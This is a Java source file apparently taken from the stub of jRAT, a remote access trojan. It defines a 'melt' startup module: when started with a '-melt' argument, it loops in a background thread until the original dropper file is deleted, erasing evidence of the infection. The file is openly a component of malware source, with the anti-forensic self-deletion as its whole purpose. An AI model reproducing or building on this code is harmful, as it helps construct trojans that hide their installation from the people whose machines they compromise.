package io.jrat.stub.modules.startup;

import io.jrat.stub.Main;
import java.io.File;
import java.util.Map;

public class MeltDropperStartupModule extends StartupModule {

	public MeltDropperStartupModule(Map<String, String> config) {
		super(config);
	}

	public void run() throws Exception {
		File file = null;	

		if (Main.args.length > 0) {
			if (Main.args[0].trim().equals("-melt")) {
				String path = Main.args[1];
				file = new File(path.replace("\"", "").trim());
			}
		}
		
		final File finalFile = file;
		
		if (file != null) {
			new Thread(new Runnable() {
				public void run() {
					if (finalFile != null) {
						while (!finalFile.delete()) {
							try {
								Thread.sleep(100L);
							} catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}
				}
			}).start();
		}
	}

}
